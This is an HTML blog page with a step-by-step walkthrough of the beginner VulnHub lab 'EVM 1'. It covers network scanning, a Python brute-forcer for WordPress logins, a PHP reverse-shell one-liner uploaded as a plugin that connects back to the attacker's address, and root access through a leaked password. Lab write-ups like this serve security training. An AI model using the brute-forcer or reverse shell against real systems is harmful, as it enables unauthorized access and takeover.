@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html lang="en" class="html" data-theme="dark"><head>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <title>
+    
+      VulnHub - EVM 1
+    
+  </title>
+
+  <!-- Begin Jekyll SEO tag v2.7.3 -->
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="VulnHub - EVM 1" />
+<meta name="author" content="s4rgaz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Description: This is super friendly box intended for Beginner’s." />
+<meta property="og:description" content="Description: This is super friendly box intended for Beginner’s." />
+<link rel="canonical" href="http://localhost:4000/evm.html" />
+<meta property="og:url" content="http://localhost:4000/evm.html" />
+<meta property="og:site_name" content="Home" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/evm.html" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-08-08T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="og:image" content="https://soopr.xyz/images/card?url=http://localhost:4000/evm.html" />
+<meta property="twitter:title" content="VulnHub - EVM 1" />
+<script type="application/ld+json">
+{"headline":"VulnHub - EVM 1","dateModified":"2021-08-08T00:00:00-05:00","datePublished":"2021-08-08T00:00:00-05:00","url":"http://localhost:4000/evm.html","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/evm.html"},"author":{"@type":"Person","name":"s4rgaz"},"@type":"BlogPosting","description":"Description: This is super friendly box intended for Beginner’s.","@context":"https://schema.org"}</script>
+<script async defer data-soopr-token="" src="https://sdk.soopr.co/soopr.js"  ></script>
+<!-- End Jekyll SEO tag -->
+ 
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Home" />
+
+  <link rel="shortcut icon" type="image/x-icon" href="//logo.png" />
+  <link rel="stylesheet" href="/assets/css/main.css" />
+  
+    <script type="text/javascript">
+  window.addEventListener('load', themeChange);
+  const currentTheme = localStorage.getItem('theme') ? localStorage.getItem('theme') : null;
+  if (currentTheme)
+    document.documentElement.setAttribute('data-theme', currentTheme);
+
+  function themeChange() {
+    let button = document.querySelector('.theme-toggle');
+
+    button.addEventListener('click', function (e) {
+      let currentTheme = document.documentElement.getAttribute('data-theme');
+      if (currentTheme === 'dark') {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'light');
+        localStorage.setItem('theme', 'light');
+      } else {
+        transition();
+        document.documentElement.setAttribute('data-theme', 'dark');
+        localStorage.setItem('theme', 'dark');
+      }
+    });
+
+    let transition = () => {
+      document.documentElement.classList.add('transition');
+      window.setTimeout(() => {
+        document.documentElement.classList.remove('transition');
+      }, 1000);
+    }
+  }
+</script>
+
+
+  
+
+</head>
+<body>
+    <main class="page-content" aria-label="Content">
+      <div class="w">
+        <header>
+
+<ul class="horizontal-list">
+  
+    <li>
+      <a href="/">
+        Home
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+    <li>
+      <a href="/walkthroughs">
+        Walkthroughs
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+    <li>
+      <a href="/about">
+        About
+      </a>
+      &nbsp;&nbsp;
+    </li>
+  
+</ul>
+ 
+<!--  <div class="dashed"></div> -->
+
+
+<!--  <h1>Home</h1> -->
+  
+</header>
+
+<a href="/"></a>
+<h1 class="post-title">VulnHub - EVM 1</h1> 
+<p class="post-date text-bold text-upcase">
+  
+    <span>August 2021</span>
+  
+</p>
+
+<div class="soopr-btn"
+   data-twitter="SooprCo"
+>
+</div>
+ 
+<p><strong>Description:</strong> This is super friendly box intended for Beginner’s.</p>
+
+<p><strong>Author:</strong> Ic0de</p>
+
+<p><strong>Operating System:</strong> Linux</p>
+
+<p><strong>Aim:</strong> To get root shell and read the flag.</p>
+
+<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/evm-1,391/">https://www.vulnhub.com/entry/evm-1,391/</a></p>
+
+<h2 id="information-gathering">Information Gathering</h2>
+<h3 id="host-discovery">Host Discovery</h3>
+<p>We start by discovering the target machine on our local network.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>arp-scan <span class="nt">-I</span> vmnet1  192.168.179.1/24
+Interface: vmnet1, <span class="nb">type</span>: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
+WARNING: host part of 192.168.179.1/24 is non-zero
+Starting arp-scan 1.9.7 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
+192.168.179.144 08:00:27:c3:25:2a       PCS Systemtechnik GmbH
+192.168.179.254 00:50:56:e2:ab:f1       VMware, Inc.
+</code></pre></div></div>
+
+<h3 id="port-scanning">Port Scanning</h3>
+
+<p>Then I perform a port scan for all TCP ports with nmap.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-T5</span> <span class="nt">-vv</span> <span class="nt">-n</span> <span class="nt">-p1-65535</span> 192.168.179.144 <span class="nt">-oG</span> nmap-tcp-ports.txt
+...
+PORT    STATE SERVICE      REASON
+22/tcp  open  ssh          syn-ack ttl 64
+53/tcp  open  domain       syn-ack ttl 64
+80/tcp  open  http         syn-ack ttl 64
+110/tcp open  pop3         syn-ack ttl 64
+139/tcp open  netbios-ssn  syn-ack ttl 64
+143/tcp open  imap         syn-ack ttl 64
+445/tcp open  microsoft-ds syn-ack ttl 64
+MAC Address: 08:00:27:C3:25:2A <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
+...
+</code></pre></div></div>
+
+<h3 id="service-enumeration">Service Enumeration</h3>
+<p>I perform the version detection and script scanning for open TCP ports.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-vv</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p22</span>,53,80,110,139,143,445 192.168.179.144 <span class="nt">-oN</span> nmap-service-enum.txt
+...
+PORT    STATE SERVICE     REASON         VERSION                                                                                                                   
+22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>                                                              
+| ssh-hostkey:                                                                                                                                                     
+|   2048 a2:d3:34:13:62:b1:18:a3:dd:db:35:c5:5a:b7:c0:78 <span class="o">(</span>RSA<span class="o">)</span>                                                                                                     
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC0defjjR1wkIrdUKeTlYiEG2/PwOaaBSPs+pp11hljbqRiUim5Kkf5QCQXS5SsQE2ljdKAVzFbdIgwtGc1TPp1UAgi55uGyzuZMGDN5vItwvzzZxcrkS9CuH9Ne
+BQh52Ak6Ki5gsgUf/odg90om62mSVX43mLP4v9nk51qnTc2InstJF37GXqGl05RaGjnramVbP/7vLTX5ondW0hfnwFjtsjkT8w1itwI/dGL/4tMnw+khj5BnTFOTxxC0S+tPlY3dE+jM31i2ftpEB5jOD74Fxeng6JF
+1/8fQi8o+9EeJcMUUs8fd9ygw1BNwzCU7gGCysz6yH62ENKApjO/WX+r                                                                                                           
+|   256 85:48:53:2a:50:c5:a0:b7:1a:ee:a4:d8:12:8e:1c:ce <span class="o">(</span>ECDSA<span class="o">)</span>                                                                                                    
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGbko+cI1o2lFazvX9zJXiqPBgUYyd110OTvgudv/xMdK7IIJkskJ/kVm6XHHre472oDWrmxJRQfTnOS1EgJbTY<span class="o">=</span> 
+|   256 36:22:92:c7:32:22:e3:34:51:bc:0e:74:9f:1c:db:aa <span class="o">(</span>ED25519<span class="o">)</span>                                                                                                  
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILux3BHKEWIkPrmFBz8ag3x3ZZBF638RTPw3GJ+ynllV                                                                                 
+53/tcp  open  domain      syn-ack ttl 64 ISC BIND 9.10.3-P4 <span class="o">(</span>Ubuntu Linux<span class="o">)</span>                                                                                         
+| dns-nsid:                                                                                                                                                        
+|_  bind.version: 9.10.3-P4-Ubuntu                                                                                                                                 
+80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>                                                                                            
+| http-methods:                                                                                                                                                    
+|_  Supported Methods: OPTIONS GET HEAD POST                                                                                                                       
+|_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>                                                                                                                       
+|_http-title: Apache2 Ubuntu Default Page: It works                                                                                                                
+110/tcp open  pop3        syn-ack ttl 64 Dovecot pop3d                                                                                                             
+|_pop3-capabilities: TOP PIPELINING AUTH-RESP-CODE SASL RESP-CODES UIDL CAPA                                                                                       
+139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 3.X - 4.X <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>                                                                               
+143/tcp open  imap        syn-ack ttl 64 Dovecot imapd                                                                                                             
+|_imap-capabilities: SASL-IR more post-login LOGIN-REFERRALS LITERAL+ listed ENABLE have OK capabilities IMAP4rev1 IDLE Pre-login ID LOGINDISABLEDA0001            
+445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.3.11-Ubuntu <span class="o">(</span>workgroup: WORKGROUP<span class="o">)</span>
+...
+</code></pre></div></div>
+
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>I focus on explore the web server and find on the page the following note: <strong><em>you can find me at /wordpress/ im vulnerable webapp :)</em></strong>.</p>
+
+<p><img src="/assets/images/evm/screenshot-1.png" alt="" /></p>
+
+<p>I request the <strong>wordpress</strong> directory but this is not resolved, so I try to see de page source with the browser, we can notice that it’s referring to another IP adress.</p>
+
+<p><img src="/assets/images/evm/screenshot-2.png" alt="" /></p>
+
+<p>To solve this we’ll use port forwarding, start the SSH service on the attacking machine and setup the IP address 192.168.56.103 for my network interface <strong>eth0</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>systemctl start ssh  
+root@kali:~<span class="nv">$ </span>ifconfig eth0 192.168.56.103
+</code></pre></div></div>
+
+<p>Then I perform the local port forwarding, as shown below:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-L</span> 192.168.56.103:80:192.168.179.144:80 s4rgaz@127.0.0.1
+</code></pre></div></div>
+
+<p>As we can see the problem was solved, we found the username <strong>c0rrupt3d_brain</strong> and in one of the comments it specifies that the webb app is susceptible to brute force attacks and that it contains vulnerable plugins.</p>
+
+<p><img src="/assets/images/evm/screenshot-3.png" alt="" /></p>
+
+<p><img src="/assets/images/evm/screenshot-4.png" alt="" /></p>
+
+<p>Then I developed a brute force tool with python, and used the rockyou wordlist.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>zcat /usr/share/wordlists/rockyou.txt.gz <span class="o">&gt;</span> wordlist.txt
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">colorama</span> <span class="kn">import</span> <span class="n">init</span><span class="p">,</span><span class="n">Fore</span>
+
+<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
+    <span class="k">print</span><span class="p">(</span><span class="s">f"Usage: </span><span class="si">{</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="si">}</span><span class="s"> [IP] [User] [Wordlist.txt]"</span><span class="p">)</span>
+    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+<span class="n">init</span><span class="p">()</span>
+<span class="n">green</span><span class="o">=</span><span class="n">Fore</span><span class="p">.</span><span class="n">GREEN</span>
+<span class="n">gray</span><span class="o">=</span><span class="n">Fore</span><span class="p">.</span><span class="n">LIGHTBLACK_EX</span>
+<span class="n">reset</span><span class="o">=</span><span class="n">Fore</span><span class="p">.</span><span class="n">RESET</span>
+
+<span class="n">target</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">user</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+<span class="n">wordlist</span><span class="o">=</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+
+<span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">user</span><span class="p">,</span><span class="n">passwd</span><span class="p">):</span>
+    <span class="n">values</span><span class="o">=</span><span class="p">{</span>
+            <span class="s">"log"</span><span class="p">:</span><span class="n">user</span><span class="p">,</span>
+            <span class="s">"pwd"</span><span class="p">:</span><span class="n">passwd</span><span class="p">,</span>
+            <span class="s">"wp-submit"</span><span class="p">:</span><span class="s">"Log+In"</span>
+            <span class="p">}</span>
+
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">r</span><span class="o">=</span><span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="s">f"http://</span><span class="si">{</span><span class="n">target</span><span class="si">}</span><span class="s">/wordpress/wp-login.php"</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">values</span><span class="p">)</span>
+        <span class="k">return</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">pass</span>
+
+<span class="n">wordlist</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="n">wordlist</span><span class="p">).</span><span class="n">read</span><span class="p">().</span><span class="n">splitlines</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">__name__</span><span class="o">==</span><span class="s">"__main__"</span><span class="p">:</span>
+    <span class="k">for</span> <span class="n">password</span> <span class="ow">in</span> <span class="n">wordlist</span><span class="p">:</span>
+        <span class="n">ans</span><span class="o">=</span><span class="n">login</span><span class="p">(</span><span class="n">user</span><span class="p">,</span><span class="n">password</span><span class="p">)</span>
+        <span class="k">if</span> <span class="s">"ERROR"</span> <span class="ow">in</span> <span class="n">ans</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">gray</span><span class="si">}</span><span class="s">[-] User: </span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s"> Password: </span><span class="si">{</span><span class="n">password</span><span class="p">:</span><span class="mi">10</span><span class="si">}{</span><span class="n">reset</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="s">f"</span><span class="si">{</span><span class="n">green</span><span class="si">}</span><span class="s">[+] User: </span><span class="si">{</span><span class="n">user</span><span class="si">}</span><span class="s"> Password: </span><span class="si">{</span><span class="n">password</span><span class="p">:</span><span class="mi">10</span><span class="si">}{</span><span class="n">reset</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+            <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+</code></pre></div></div>
+<p>I run the script and after a time we have the password.</p>
+
+<p><strong>note:</strong> for do this faster you can use threads.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>./bf.py 192.168.56.103 c0rrupt3d_brain wordlist.txt
+...
+<span class="o">[</span>+] User: c0rrupt3d_brain Password: 24992499 
+</code></pre></div></div>
+
+<p>We login to the wordpress web page and have successful access.</p>
+
+<p><img src="/assets/images/evm/screenshot-5.png" alt="" /></p>
+
+<p><img src="/assets/images/evm/screenshot-6.png" alt="" /></p>
+
+<h2 id="exploitation">Exploitation</h2>
+<h3 id="inject-malicious-plugin">Inject Malicious Plugin</h3>
+<p>We can upload php files as a plugin, for this I create a simple php reverse shell.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">cat </span>shell.php 
+&lt;?php <span class="nb">exec</span><span class="o">(</span><span class="s2">"/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/192.168.179.1/443 0&gt;&amp;1'"</span><span class="o">)</span><span class="p">;</span> ?&gt;
+</code></pre></div></div>
+
+<p>Then we add a new plugin in the following path <strong>Plugins -&gt; Add New -&gt; Upload Plugin</strong>, and later we click <strong>Install Now</strong>.</p>
+
+<p><img src="/assets/images/evm/screenshot-7.png" alt="" /></p>
+
+<p><img src="/assets/images/evm/screenshot-8.png" alt="" /></p>
+
+<p>Apparently we can’t see it, so we go to <strong>Media -&gt; Library</strong> and we can see our shell uploaded.</p>
+
+<p><img src="/assets/images/evm/screenshot-9.png" alt="" /></p>
+
+<p>We access it and we can see the URL to run the reverse shell.</p>
+
+<p><img src="/assets/images/evm/screenshot-10.png" alt="" /></p>
+
+<p>Then we first setup a netcat listener on port 443 and request with the browser the reverse shell.
+<img src="/assets/images/evm/screenshot-11.png" alt="" /></p>
+
+<p>And we get a reverse shell with permissions that the web application is running.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
+listening on <span class="o">[</span>any] 443 ...
+connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.144] 43786
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1439<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+&lt;var/www/html/wordpress/wp-content/uploads/2021/08<span class="nv">$ </span>script bash /dev/null
+script bash /dev/null
+<span class="nv">$ </span>bash
+bash
+&lt;var/www/html/wordpress/wp-content/uploads/2021/08<span class="nv">$ </span><span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
+</code></pre></div></div>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="exposed-credentials">Exposed Credentials</h3>
+
+<p>Into the <strong>/home/root3r</strong> directory I found the password for the root user in the <strong>.root_password_ssh.txt</strong> file.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
+<span class="nb">ls</span> <span class="nt">-la</span>    
+total 40            
+drwxr-xr-x 3 www-data www-data 4096 Nov  1  2019 <span class="nb">.</span>  
+drwxr-xr-x 3 root     root     4096 Oct 30  2019 ..  
+<span class="nt">-rw-r--r--</span> 1 www-data www-data  515 Oct 30  2019 .bash_history
+<span class="nt">-rw-r--r--</span> 1 www-data www-data  220 Oct 30  2019 .bash_logout 
+<span class="nt">-rw-r--r--</span> 1 www-data www-data 3771 Oct 30  2019 .bashrc
+drwxr-xr-x 2 www-data www-data 4096 Oct 30  2019 .cache
+<span class="nt">-rw-r--r--</span> 1 www-data www-data   22 Oct 30  2019 .mysql_history
+<span class="nt">-rw-r--r--</span> 1 www-data www-data  655 Oct 30  2019 .profile
+<span class="nt">-rw-r--r--</span> 1 www-data www-data    8 Oct 31  2019 .root_password_ssh.txt
+<span class="nt">-rw-r--r--</span> 1 www-data www-data    0 Oct 30  2019 .sudo_as_admin_successful
+<span class="nt">-rw-r--r--</span> 1 root     root        4 Nov  1  2019 test.txt
+www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r<span class="nv">$ </span><span class="nb">cat</span> .roo<span class="k">*</span>
+<span class="nb">cat</span> .roo<span class="k">*</span>
+willy26
+</code></pre></div></div>
+<p>Then we switch to the root user with the found password, and we get root.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu-extermely-vulnerable-m4ch1ine:/home/root3r<span class="nv">$ </span>su -
+su -
+Password: willy26
+
+root@ubuntu-extermely-vulnerable-m4ch1ine:~# <span class="nb">id
+id
+</span><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+root@ubuntu-extermely-vulnerable-m4ch1ine:~# <span class="nb">cat </span>proof.txt
+<span class="nb">cat </span>proof.txt
+voila you have successfully pwned me :<span class="o">)</span> <span class="o">!!!</span>
+:D
+</code></pre></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <footer>
+<!--	  <div class="dashed"></div> -->
+    <ul class="horizontal-list">
+  
+</ul>
+
+  </footer>
+
+
+        
+          <button title="Toggle Theme" class="theme-toggle">
+  <svg viewBox="0 0 32 32" width="24" height="24" fill="currentcolor">
+    <circle cx="16" cy="16" r="14" fill="none" stroke="currentcolor" stroke-width="4"></circle>
+    <path d="
+             M 16 0
+             A 16 16 0 0 0 16 32
+             z">
+    </path>
+  </svg>
+</button>
+
+        
+        <div class="credits">&copy;&nbsp;2022&nbsp;s4rgaz
+          &nbsp;
+		  •
+          &nbsp;<!--Powered by <a href="https://www.soopr.co" target="_blank" rel="noreferrer">Soopr</a>
+          &nbsp;
+		  •
+          &nbsp;-->
+		  <!--Theme&nbsp; <a href="https://github.com/abhinavs/moonwalk" target="_blank" rel="noreferrer">Moonwalk</a>-->
+		  RSS&nbsp; <a href="/feed.xml" target="_blank" rel="noreferrer">Feed</a>
+        </div>
+      </div>
+    </main><script async defer src="https://sdk.soopr.co/soopr.js"></script></body>
+</html>
